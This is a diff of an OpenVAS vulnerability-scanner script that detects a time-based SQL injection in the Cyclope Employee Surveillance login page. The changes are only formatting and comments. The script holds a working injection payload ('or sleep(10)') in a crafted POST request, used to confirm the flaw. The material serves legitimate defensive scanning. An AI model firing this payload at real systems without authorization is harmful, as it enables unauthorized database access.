@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_cyclope_employee_surveillance_sql_inj_vuln.nasl 5814 2017-03-31 09:13:55Z cfi $
+# $Id: gb_cyclope_employee_surveillance_sql_inj_vuln.nasl 10941 2018-08-13 14:33:26Z asteins $
 #
 # Cyclope Employee Surveillance Solution SQL Injection Vulnerability
 #
@@ -27,15 +27,15 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803006");
-  script_version("$Revision: 5814 $");
+  script_version("$Revision: 10941 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-31 11:13:55 +0200 (Fri, 31 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-13 16:33:26 +0200 (Mon, 13 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-08-14 10:50:03 +0530 (Tue, 14 Aug 2012)");
   script_name("Cyclope Employee Surveillance Solution SQL Injection Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/50200");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20393");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115406/cyclope-sql.txt");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/50200");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20393");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115406/cyclope-sql.txt");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
@@ -44,17 +44,17 @@ if(description)
   script_require_ports("Services/www", 7879);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation will let attackers to manipulate SQL
+  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL
   queries by injecting arbitrary SQL code.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "Cyclope Employee Surveillance Solution version 6.0.8.5 and
+  script_tag(name:"affected", value:"Cyclope Employee Surveillance Solution version 6.0.8.5 and
   prior");
-  script_tag(name : "insight" , value : "Input passed to 'username' and 'password' parameter in '/index.php'
+  script_tag(name:"insight", value:"Input passed to 'username' and 'password' parameter in '/index.php'
   page is not properly verified before being used in SQL queries.");
-  script_tag(name : "solution" , value : "Update to version 6.2.1 or later,
+  script_tag(name:"solution", value:"Update to version 6.2.1 or later,
   For updates refer to http://www.cyclope-series.com");
-  script_tag(name : "summary" , value : "This host is running Cyclope Employee Surveillance Solution
+  script_tag(name:"summary", value:"This host is running Cyclope Employee Surveillance Solution
   and is prone to SQL injection vulnerability.");
   script_tag(name:"solution_type", value:"VendorFix");
 
@@ -65,19 +65,6 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-
-## Variable Initialization
-port =0;
-req1 = "";
-req2 = "";
-sndReq = "";
-rcvRes = "";
-postdata1 = "";
-postdata2 = "";
-nor_stop1 = "";
-nor_stop2 = "";
-nor_start1 = "";
-nor_start2 = "";
 
 port = get_http_port(default:7879);
 
@@ -91,20 +78,17 @@ url = "/index.php";
 
 rcvRes = http_get_cache(item:url, port:port);
 
-## Confirm the application
 if(rcvRes && rcvRes =~ "HTTP/1.. 200" && '<title>Cyclope' >< rcvRes &&
    "Cyclope Employee Surveillance Solution" >< rcvRes)
 {
   postdata1 = "act=auth-login&pag=login&username=xxx&password=aaa";
 
-  ## Construct a POST normal request
   req1 = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata1), "\r\n",
                 "\r\n", postdata1);
 
-  ## Check the response time for Normal request
   ## Initial time
   nor_start1 = unixtime();
 
@@ -113,18 +97,15 @@ if(rcvRes && rcvRes =~ "HTTP/1.. 200" && '<title>Cyclope' >< rcvRes &&
 
   nor_stop1 = unixtime();
 
-  ## Construct a POST attack request
   postdata2 = "act=auth-login&pag=login&username=x%27+or+sleep%2810%29+and+" +
               "%271%27%3D%271&password=aaa";
 
-  ## Construct a POST attack request
   req2 = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata2), "\r\n",
                 "\r\n", postdata2);
 
-  ## Check for response time for exploit request with sleep 10
   nor_start2  = unixtime();
 
   ## Send the attack
